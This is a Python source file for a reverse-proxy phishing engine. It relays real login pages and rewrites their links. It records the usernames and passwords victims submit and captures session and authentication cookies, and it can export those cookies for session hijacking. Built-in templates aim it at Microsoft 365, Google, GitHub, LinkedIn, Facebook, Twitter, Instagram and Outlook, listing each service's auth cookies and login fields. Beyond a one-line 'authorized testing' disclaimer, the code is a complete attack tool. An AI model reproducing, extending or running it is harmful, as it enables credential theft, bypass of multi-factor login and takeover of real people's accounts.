"""
Reverse Proxy Phishing Engine

A comprehensive reverse proxy for credential and session capture.
Features:
- Path-based routing (e.g., /phishlet_id/path)
- Static resource proxying
- Page preloading/caching
- Credential and cookie capture

For authorized security testing only.
"""

import asyncio
import aiohttp
import re
import json
import logging
import uuid
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlencode, urlparse
from aiohttp import web, ClientSession, TCPConnector, CookieJar

logger = logging.getLogger(__name__)

# Default proxy port
PROXY_PORT = 8020


@dataclass
class PhishletConfig:
    """Configuration for a phishlet (target site proxy config)"""
    id: str
    name: str
    target_host: str
    phishing_host: str = ""
    target_scheme: str = "https"

    # Additional domains to proxy (e.g., static CDNs)
    proxy_domains: List[str] = field(default_factory=list)

    # Capture configuration
    capture_cookies: List[str] = field(default_factory=list)
    capture_fields: List[str] = field(default_factory=lambda: ["username", "password", "email", "login", "passwd", "user", "pass"])
    auth_tokens: List[str] = field(default_factory=list)
    auth_urls: List[str] = field(default_factory=list)

    # Domain replacements (legacy, still supported)
    sub_filters: Dict[str, str] = field(default_factory=dict)

    # Optional JS to inject
    js_inject: Optional[str] = None

    # Runtime state
    is_active: bool = False
    listen_port: Optional[int] = None


@dataclass
class CapturedSession:
    """A captured victim session"""
    id: str
    phishlet_id: str
    victim_ip: str
    user_agent: str
    created_at: str
    landing_url: str = ""

    cookies: Dict[str, str] = field(default_factory=dict)
    credentials: Dict[str, str] = field(default_factory=dict)
    tokens: Dict[str, str] = field(default_factory=dict)
    requests: List[Dict] = field(default_factory=list)

    authenticated: bool = False
    authenticated_at: Optional[str] = None


@dataclass
class CachedPage:
    """A cached page for faster delivery"""
    url: str
    content: bytes
    content_type: str
    headers: Dict[str, str]
    cached_at: datetime
    expires_at: datetime


class ProxyEngine:
    """Core reverse proxy engine for phishing attacks."""

    def __init__(self):
        self.phishlets: Dict[str, PhishletConfig] = {}
        self.sessions: Dict[str, CapturedSession] = {}
        self._client_session: Optional[ClientSession] = None
        self._server_runner: Optional[web.AppRunner] = None
        self._server_started: bool = False
        self._port: int = PROXY_PORT

        # Page cache for preloading
        self._page_cache: Dict[str, CachedPage] = {}
        self._cache_ttl: int = 300  # 5 minutes

    async def init(self):
        """Initialize the proxy engine"""
        if self._client_session:
            return

        connector = TCPConnector(ssl=False, limit=100, force_close=True)
        self._client_session = ClientSession(
            connector=connector,
            cookie_jar=CookieJar(unsafe=True),
            timeout=aiohttp.ClientTimeout(total=60),
            headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'identity',  # No compression for easier rewriting
            },
            # Increase limits for sites with large headers/cookies
            read_bufsize=2**18,  # 256KB buffer
            max_line_size=32768,  # 32KB max line size
            max_field_size=32768,  # 32KB max header field size
        )
        logger.info("Proxy engine initialized")

    async def cleanup(self):
        """Cleanup resources"""
        if self._client_session:
            await self._client_session.close()
            self._client_session = None

        if self._server_runner:
            await self._server_runner.cleanup()
            self._server_runner = None
            self._server_started = False

    async def start_server(self, port: int = PROXY_PORT):
        """Start the main proxy server"""
        if self._server_started:
            return {'status': 'already_running', 'port': self._port}

        await self.init()

        app = web.Application()

        # Landing page
        app.router.add_get('/', self._handle_landing)

        # Static/external domain proxy: /_ext/{domain}/{path}
        app.router.add_route('*', '/_ext/{domain}/{path:.*}', self._handle_external_request)

        # Phishlet routes: /{phishlet_id}/{path}
        app.router.add_route('*', '/{phishlet_id}', self._handle_proxy_request)
        app.router.add_route('*', '/{phishlet_id}/{path:.*}', self._handle_proxy_request)

        self._server_runner = web.AppRunner(app)
        await self._server_runner.setup()

        site = web.TCPSite(self._server_runner, '0.0.0.0', port)
        await site.start()

        self._server_started = True
        self._port = port

        logger.info(f"Proxy server started on port {port}")
        return {'status': 'running', 'port': port}

    async def stop_server(self):
        """Stop the proxy server"""
        if self._server_runner:
            await self._server_runner.cleanup()
            self._server_runner = None
            self._server_started = False
            logger.info("Proxy server stopped")

    # === Page Preloading ===

    async def preload_page(self, phishlet_id: str) -> bool:
        """Preload the target page into cache"""
        phishlet = self.phishlets.get(phishlet_id)
        if not phishlet:
            return False

        await self.init()

        url = f"{phishlet.target_scheme}://{phishlet.target_host}/"
        cache_key = f"{phishlet_id}:/"

        try:
            headers = {
                'Host': phishlet.target_host,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            }

            async with self._client_session.get(url, headers=headers, ssl=False) as resp:
                content = await resp.read()
                content_type = resp.content_type or 'text/html'

                # Rewrite content
                if 'text' in content_type or 'html' in content_type or 'javascript' in content_type:
                    charset = resp.charset or 'utf-8'
                    text_content = content.decode(charset, errors='replace')
                    text_content = self._rewrite_content(text_content, phishlet)
                    content = text_content.encode(charset)

                # Cache headers (exclude content-type to avoid conflict when serving)
                resp_headers = {k: v for k, v in resp.headers.items()
                              if k.lower() not in {'content-encoding', 'content-length', 'transfer-encoding', 'content-type'}}

                self._page_cache[cache_key] = CachedPage(
                    url=url,
                    content=content,
                    content_type=content_type,
                    headers=resp_headers,
                    cached_at=datetime.now(),
                    expires_at=datetime.now() + timedelta(seconds=self._cache_ttl)
                )

                logger.info(f"Preloaded {phishlet.name} homepage ({len(content)} bytes)")
                return True

        except Exception as e:
            logger.error(f"Failed to preload {phishlet.name}: {e}")
            return False

    def _get_cached_page(self, phishlet_id: str, path: str) -> Optional[CachedPage]:
        """Get a page from cache if available and not expired"""
        cache_key = f"{phishlet_id}:{path}"
        cached = self._page_cache.get(cache_key)

        if cached and cached.expires_at > datetime.now():
            return cached

        # Remove expired cache
        if cached:
            del self._page_cache[cache_key]

        return None

    # === Request Handlers ===

    async def _handle_landing(self, request: web.Request) -> web.Response:
        """Handle requests to the root path"""
        phishlet_list = []
        for pid, config in self.phishlets.items():
            status = "🟢 Active" if config.is_active else "⚪ Inactive"
            phishlet_list.append(
                f'<li><a href="/{pid}/">{config.name}</a> → {config.target_host} {status}</li>'
            )

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Proxy Server</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }}
        h1 {{ color: #333; }}
        ul {{ list-style: none; padding: 0; }}
        li {{ padding: 10px; margin: 5px 0; background: #f5f5f5; border-radius: 5px; }}
        a {{ color: #0066cc; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
        .footer {{ margin-top: 30px; color: #666; font-size: 12px; }}
    </style>
</head>
<body>
    <h1>🔓 Reverse Proxy Server</h1>
    <p>Available targets:</p>
    <ul>{''.join(phishlet_list) if phishlet_list else '<li>No targets configured. Add one from the dashboard.</li>'}</ul>
    <p class="footer">For authorized security testing only.</p>
</body>
</html>"""
        return web.Response(text=html, content_type='text/html')

    async def _handle_external_request(self, request: web.Request) -> web.Response:
        """Handle requests for external domains (CDNs, static resources)"""
        domain = request.match_info.get('domain', '')
        path = request.match_info.get('path', '')

        if not domain:
            return web.Response(text="Missing domain", status=400)

        await self.init()

        # Build target URL
        target_url = f"https://{domain}/{path}"
        if request.query_string:
            target_url += f"?{request.query_string}"

        # Forward only essential headers
        headers = {
            'Host': domain,
            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0'),
            'Accept': request.headers.get('Accept', '*/*'),
            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.5'),
        }

        try:
            async with self._client_session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=await request.read() if request.method in ('POST', 'PUT') else None,
                ssl=False,
                allow_redirects=False
            ) as resp:
                body = await resp.read()

                resp_headers = {}
                for key, value in resp.headers.items():
                    if key.lower() not in {'content-encoding', 'content-length', 'transfer-encoding', 'connection'}:
                        resp_headers[key] = value

                return web.Response(body=body, status=resp.status, headers=resp_headers)

        except Exception as e:
            logger.error(f"External proxy error for {domain}: {e}")
            return web.Response(text=f"Error fetching {domain}: {e}", status=502)

    async def _handle_proxy_request(self, request: web.Request) -> web.Response:
        """Handle proxy requests for a specific phishlet"""
        phishlet_id = request.match_info.get('phishlet_id', '')
        path = request.match_info.get('path', '')

        # Get the phishlet config
        phishlet = self.phishlets.get(phishlet_id)
        if not phishlet:
            return web.Response(
                text=f"Target '{phishlet_id}' not found. Available: {list(self.phishlets.keys())}",
                status=404
            )

        await self.init()

        # Check cache for GET requests
        if request.method == 'GET':
            cached = self._get_cached_page(phishlet_id, f"/{path}")
            if cached:
                logger.debug(f"Serving cached page for /{phishlet_id}/{path}")
                # Remove content-type from headers to avoid conflict
                headers = {k: v for k, v in cached.headers.items()
                          if k.lower() not in {'content-type', 'content-length'}}
                response = web.Response(
                    body=cached.content,
                    content_type=cached.content_type,
                    headers=headers
                )
                return response

        # Get or create session
        session = self._get_or_create_session(phishlet_id, request)

        # Build target URL
        target_url = f"{phishlet.target_scheme}://{phishlet.target_host}/{path}"
        if request.query_string:
            target_url += f"?{request.query_string}"

        # Prepare headers - only forward essential ones to avoid header size issues
        headers = {
            'Host': phishlet.target_host,
            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
            'Accept': request.headers.get('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.5'),
        }

        # Only copy specific safe headers to avoid size issues
        safe_headers = {'content-type', 'referer', 'origin', 'x-requested-with', 'sec-fetch-dest',
                        'sec-fetch-mode', 'sec-fetch-site', 'cache-control', 'pragma'}
        for key, value in request.headers.items():
            if key.lower() in safe_headers:
                # Rewrite referer/origin
                if key.lower() in ('referer', 'origin'):
                    value = self._rewrite_url_reverse(value, phishlet)
                headers[key] = value

        # Get request body
        body = None
        if request.method in ('POST', 'PUT', 'PATCH'):
            content_type = request.content_type or ''

            if 'application/x-www-form-urlencoded' in content_type:
                form_data = dict(await request.post())
                body = urlencode(form_data)

                creds = self._extract_credentials(form_data, phishlet)
                if creds:
                    session.credentials.update(creds)
                    logger.info(f"[{phishlet.name}] 🔑 Captured credentials: {list(creds.keys())}")

            elif 'application/json' in content_type:
                try:
                    json_data = await request.json()
                    body = json.dumps(json_data)

                    if isinstance(json_data, dict):
                        creds = self._extract_credentials(json_data, phishlet)
                        if creds:
                            session.credentials.update(creds)
                            logger.info(f"[{phishlet.name}] 🔑 Captured JSON credentials")
                except:
                    body = await request.read()
            else:
                body = await request.read()

        # Forward cookies
        cookies = dict(request.cookies)

        try:
            async with self._client_session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=body,
                cookies=cookies,
                allow_redirects=False,
                ssl=False
            ) as resp:
                resp_body = await resp.read()

                # Capture cookies
                for cookie in resp.cookies.values():
                    session.cookies[cookie.key] = cookie.value
                    if cookie.key in phishlet.capture_cookies or cookie.key in phishlet.auth_tokens:
                        session.tokens[cookie.key] = cookie.value
                        logger.info(f"[{phishlet.name}] 🍪 Captured token: {cookie.key}")

                # Check auth success
                if not session.authenticated:
                    if self._check_auth_success(session, phishlet, str(resp.url), session.cookies):
                        session.authenticated = True
                        session.authenticated_at = datetime.now().isoformat()
                        logger.info(f"[{phishlet.name}] ✅ Session {session.id[:8]} authenticated!")

                # Rewrite response content
                content_type = resp.content_type or ''
                if resp_body and ('text' in content_type or 'html' in content_type or
                                  'javascript' in content_type or 'json' in content_type or
                                  'css' in content_type):
                    try:
                        charset = resp.charset or 'utf-8'
                        content = resp_body.decode(charset, errors='replace')
                        content = self._rewrite_content(content, phishlet)
                        resp_body = content.encode(charset)
                    except Exception as e:
                        logger.warning(f"Content rewrite failed: {e}")

                # Build response headers
                resp_headers = {}
                skip_resp_headers = {'content-encoding', 'content-length', 'transfer-encoding', 'connection'}

                for key, value in resp.headers.items():
                    if key.lower() not in skip_resp_headers:
                        if key.lower() == 'location':
                            value = self._rewrite_url(value, phishlet)
                        elif key.lower() == 'set-cookie':
                            # Rewrite cookie domain
                            value = re.sub(r'[Dd]omain=[^;]+;?', '', value)
                        resp_headers[key] = value

                response = web.Response(
                    body=resp_body,
                    status=resp.status,
                    headers=resp_headers
                )

                # Set session tracking cookie
                response.set_cookie('_proxy_session', session.id, max_age=86400, httponly=True, path='/')

                # Log request
                session.requests.append({
                    'timestamp': datetime.now().isoformat(),
                    'method': request.method,
                    'path': f"/{path}",
                    'status': resp.status
                })

                return response

        except aiohttp.ClientError as e:
            logger.error(f"Proxy error for {phishlet.name}: {e}")
            return web.Response(text=f"Could not connect to {phishlet.target_host}: {e}", status=502)
        except Exception as e:
            logger.error(f"Proxy error: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            return web.Response(text=f"Proxy error: {e}", status=500)

    # === Content Rewriting ===

    def _rewrite_content(self, content: str, phishlet: PhishletConfig) -> str:
        """Rewrite content to route all resources through proxy"""
        proxy_base = f"http://localhost:{self._port}"

        # Replace main target domain
        content = content.replace(
            f'https://{phishlet.target_host}',
            f'{proxy_base}/{phishlet.id}'
        )
        content = content.replace(
            f'http://{phishlet.target_host}',
            f'{proxy_base}/{phishlet.id}'
        )
        content = content.replace(
            f'//{phishlet.target_host}',
            f'//localhost:{self._port}/{phishlet.id}'
        )

        # Replace additional proxy domains through /_ext/
        for domain in phishlet.proxy_domains:
            content = content.replace(
                f'https://{domain}',
                f'{proxy_base}/_ext/{domain}'
            )
            content = content.replace(
                f'http://{domain}',
                f'{proxy_base}/_ext/{domain}'
            )
            content = content.replace(
                f'//{domain}',
                f'//localhost:{self._port}/_ext/{domain}'
            )

        # Apply legacy sub_filters
        for target_domain, replacement in phishlet.sub_filters.items():
            content = content.replace(target_domain, replacement)

        # Inject custom JS if configured
        if phishlet.js_inject and '</head>' in content:
            inject_script = f"<script>{phishlet.js_inject}</script>"
            content = content.replace('</head>', f"{inject_script}</head>")

        return content

    def _rewrite_url(self, url: str, phishlet: PhishletConfig) -> str:
        """Rewrite a URL to go through the proxy"""
        proxy_base = f"http://localhost:{self._port}"

        if phishlet.target_host in url:
            url = url.replace(f'https://{phishlet.target_host}', f'{proxy_base}/{phishlet.id}')
            url = url.replace(f'http://{phishlet.target_host}', f'{proxy_base}/{phishlet.id}')

        for domain in phishlet.proxy_domains:
            if domain in url:
                url = url.replace(f'https://{domain}', f'{proxy_base}/_ext/{domain}')
                url = url.replace(f'http://{domain}', f'{proxy_base}/_ext/{domain}')

        return url

    def _rewrite_url_reverse(self, url: str, phishlet: PhishletConfig) -> str:
        """Rewrite proxy URL back to target URL"""
        proxy_base = f"http://localhost:{self._port}"
        url = url.replace(f'{proxy_base}/{phishlet.id}', f'{phishlet.target_scheme}://{phishlet.target_host}')
        return url

    # === Session Management ===

    def _get_or_create_session(self, phishlet_id: str, request: web.Request) -> CapturedSession:
        """Get existing session or create a new one"""
        session_id = request.cookies.get('_proxy_session')

        if session_id and session_id in self.sessions:
            return self.sessions[session_id]

        session_id = str(uuid.uuid4())

        try:
            landing_url = str(request.path_qs)
        except:
            landing_url = request.path or '/'

        session = CapturedSession(
            id=session_id,
            phishlet_id=phishlet_id,
            victim_ip=request.remote or 'unknown',
            user_agent=request.headers.get('User-Agent', 'unknown'),
            created_at=datetime.now().isoformat(),
            landing_url=landing_url
        )
        self.sessions[session_id] = session
        logger.info(f"New session {session_id[:8]} from {session.victim_ip}")
        return session

    def _extract_credentials(self, data: Dict[str, Any], phishlet: PhishletConfig) -> Dict[str, str]:
        """Extract credentials from form data"""
        credentials = {}
        for key, value in data.items():
            key_lower = key.lower()
            for field_pattern in phishlet.capture_fields:
                if field_pattern.lower() in key_lower:
                    if isinstance(value, list):
                        value = value[0] if value else ''
                    credentials[key] = str(value)
                    break
        return credentials

    def _check_auth_success(self, session: CapturedSession, phishlet: PhishletConfig,
                           response_url: str, cookies: Dict[str, str]) -> bool:
        """Check if authentication was successful"""
        for auth_url in phishlet.auth_urls:
            if auth_url in response_url:
                return True

        for token_name in phishlet.auth_tokens:
            if token_name in cookies:
                session.tokens[token_name] = cookies[token_name]
                return True

        has_creds = any(k.lower() in ['password', 'passwd', 'pass'] for k in session.credentials.keys())
        has_session = len(session.cookies) > 2

        return has_creds and has_session

    # === Phishlet Management ===

    def add_phishlet(self, config: PhishletConfig):
        """Add a phishlet configuration"""
        self.phishlets[config.id] = config
        logger.info(f"Added phishlet: {config.name} -> {config.target_host}")

    def remove_phishlet(self, phishlet_id: str):
        """Remove a phishlet"""
        if phishlet_id in self.phishlets:
            del self.phishlets[phishlet_id]

    def get_phishlet(self, phishlet_id: str) -> Optional[PhishletConfig]:
        """Get a phishlet by ID"""
        return self.phishlets.get(phishlet_id)

    async def start_phishlet(self, phishlet_id: str, port: int = PROXY_PORT) -> Dict:
        """Start serving a phishlet (starts server if needed)"""
        phishlet = self.phishlets.get(phishlet_id)
        if not phishlet:
            raise ValueError(f"Phishlet {phishlet_id} not found")

        # Start server if not running
        if not self._server_started:
            await self.start_server(port)

        phishlet.is_active = True
        phishlet.listen_port = self._port

        # Preload the page
        await self.preload_page(phishlet_id)

        proxy_url = f"http://localhost:{self._port}/{phishlet_id}/"
        logger.info(f"Phishlet {phishlet.name} active at {proxy_url}")

        return {
            'status': 'running',
            'phishlet_id': phishlet_id,
            'port': self._port,
            'proxy_url': proxy_url
        }

    async def stop_phishlet(self, phishlet_id: str):
        """Deactivate a phishlet"""
        if phishlet_id in self.phishlets:
            self.phishlets[phishlet_id].is_active = False
            # Clear cache for this phishlet
            keys_to_remove = [k for k in self._page_cache if k.startswith(f"{phishlet_id}:")]
            for key in keys_to_remove:
                del self._page_cache[key]
            logger.info(f"Phishlet {phishlet_id} deactivated")

    def get_sessions(self, phishlet_id: Optional[str] = None) -> List[CapturedSession]:
        """Get captured sessions"""
        sessions = list(self.sessions.values())
        if phishlet_id:
            sessions = [s for s in sessions if s.phishlet_id == phishlet_id]
        return sessions

    def get_session(self, session_id: str) -> Optional[CapturedSession]:
        """Get a specific session"""
        return self.sessions.get(session_id)

    def get_authenticated_sessions(self) -> List[CapturedSession]:
        """Get all authenticated sessions"""
        return [s for s in self.sessions.values() if s.authenticated]

    def export_session_cookies(self, session_id: str, format: str = 'header') -> str:
        """Export session cookies in various formats"""
        session = self.sessions.get(session_id)
        if not session:
            return ""

        if format == 'header':
            return '; '.join(f'{k}={v}' for k, v in session.cookies.items())
        elif format == 'json':
            return json.dumps(session.cookies, indent=2)
        elif format == 'netscape':
            lines = ["# Netscape HTTP Cookie File"]
            phishlet = self.phishlets.get(session.phishlet_id)
            domain = phishlet.target_host if phishlet else 'example.com'
            for name, value in session.cookies.items():
                lines.append(f"{domain}\tTRUE\t/\tFALSE\t0\t{name}\t{value}")
            return '\n'.join(lines)
        return ""

    def get_stats(self) -> Dict:
        """Get proxy engine statistics"""
        return {
            'total_phishlets': len(self.phishlets),
            'active_phishlets': sum(1 for p in self.phishlets.values() if p.is_active),
            'total_sessions': len(self.sessions),
            'authenticated_sessions': len(self.get_authenticated_sessions()),
            'total_credentials': sum(len(s.credentials) for s in self.sessions.values()),
            'total_cookies': sum(len(s.cookies) for s in self.sessions.values()),
            'server_running': self._server_started,
            'server_port': self._port if self._server_started else None,
            'cached_pages': len(self._page_cache)
        }


# Global proxy engine instance
proxy_engine = ProxyEngine()


# Pre-built phishlet templates with static domains
PHISHLET_TEMPLATES = {
    'microsoft365': PhishletConfig(
        id='microsoft365',
        name='Microsoft 365',
        target_host='login.microsoftonline.com',
        target_scheme='https',
        proxy_domains=[
            'aadcdn.msftauth.net',
            'aadcdn.msauth.net',
            'logincdn.msftauth.net',
            'login.live.com',
            'account.live.com',
        ],
        capture_cookies=['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT'],
        capture_fields=['login', 'loginfmt', 'passwd', 'password', 'username', 'email'],
        auth_tokens=['ESTSAUTHPERSISTENT'],
        auth_urls=['/kmsi', '/oauth2/authorize', '/common/reprocess'],
    ),
    'google': PhishletConfig(
        id='google',
        name='Google',
        target_host='accounts.google.com',
        target_scheme='https',
        proxy_domains=[
            'ssl.gstatic.com',
            'www.gstatic.com',
            'fonts.gstatic.com',
            'apis.google.com',
        ],
        capture_cookies=['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'OSID'],
        capture_fields=['identifier', 'email', 'password', 'Passwd', 'Email'],
        auth_tokens=['SID', 'HSID'],
        auth_urls=['/signin/challenge', '/ServiceLogin', '/CheckCookie'],
    ),
    'github': PhishletConfig(
        id='github',
        name='GitHub',
        target_host='github.com',
        target_scheme='https',
        proxy_domains=[
            'github.githubassets.com',
            'avatars.githubusercontent.com',
            'collector.github.com',
        ],
        capture_cookies=['user_session', 'logged_in', '__Host-user_session_same_site'],
        capture_fields=['login', 'password'],
        auth_tokens=['user_session'],
        auth_urls=['/dashboard', '/settings'],
    ),
    'linkedin': PhishletConfig(
        id='linkedin',
        name='LinkedIn',
        target_host='www.linkedin.com',
        target_scheme='https',
        proxy_domains=[
            'static.licdn.com',
            'static-exp1.licdn.com',
            'static-exp2.licdn.com',
            'media.licdn.com',
            'platform.linkedin.com',
        ],
        capture_cookies=['li_at', 'JSESSIONID', 'liap'],
        capture_fields=['session_key', 'session_password', 'username', 'password'],
        auth_tokens=['li_at'],
        auth_urls=['/feed/', '/mynetwork/'],
    ),
    'facebook': PhishletConfig(
        id='facebook',
        name='Facebook',
        target_host='www.facebook.com',
        target_scheme='https',
        proxy_domains=[
            'static.xx.fbcdn.net',
            'scontent.xx.fbcdn.net',
            'connect.facebook.net',
        ],
        capture_cookies=['c_user', 'xs', 'datr', 'sb'],
        capture_fields=['email', 'pass', 'login', 'password'],
        auth_tokens=['c_user', 'xs'],
        auth_urls=['/home.php', '/feed/'],
    ),
    'twitter': PhishletConfig(
        id='twitter',
        name='Twitter/X',
        target_host='twitter.com',
        target_scheme='https',
        proxy_domains=[
            'abs.twimg.com',
            'pbs.twimg.com',
            'api.twitter.com',
        ],
        capture_cookies=['auth_token', 'ct0', 'twid'],
        capture_fields=['username', 'password', 'session[username_or_email]', 'session[password]'],
        auth_tokens=['auth_token'],
        auth_urls=['/home', '/i/flow/login'],
    ),
    'instagram': PhishletConfig(
        id='instagram',
        name='Instagram',
        target_host='www.instagram.com',
        target_scheme='https',
        proxy_domains=[
            'static.cdninstagram.com',
            'scontent.cdninstagram.com',
            'i.instagram.com',
        ],
        capture_cookies=['sessionid', 'ds_user_id', 'csrftoken'],
        capture_fields=['username', 'password', 'enc_password'],
        auth_tokens=['sessionid'],
        auth_urls=['/accounts/onetap/'],
    ),
    'office365': PhishletConfig(
        id='office365',
        name='Office 365 (Outlook)',
        target_host='outlook.office365.com',
        target_scheme='https',
        proxy_domains=[
            'res.cdn.office.net',
            'r4.res.office365.com',
            'login.microsoftonline.com',
        ],
        capture_cookies=['ClientId', 'X-OWA-CANARY'],
        capture_fields=['username', 'password', 'passwd'],
        auth_tokens=['X-OWA-CANARY'],
        auth_urls=['/owa/', '/mail/'],
    ),
}


def get_phishlet_template(template_name: str, your_domain: str = 'localhost', company: str = 'company') -> Optional[PhishletConfig]:
    """Get a phishlet template with custom domain"""
    template = PHISHLET_TEMPLATES.get(template_name)
    if not template:
        return None

    phishlet_id = str(uuid.uuid4())[:8]

    return PhishletConfig(
        id=phishlet_id,
        name=f"{template.name} ({company})",
        target_host=template.target_host,
        phishing_host=f"{template_name}.{your_domain}",
        target_scheme=template.target_scheme,
        proxy_domains=list(template.proxy_domains),
        capture_cookies=list(template.capture_cookies),
        capture_fields=list(template.capture_fields),
        auth_tokens=list(template.auth_tokens),
        auth_urls=list(template.auth_urls),
        sub_filters=dict(template.sub_filters) if template.sub_filters else {},
    )
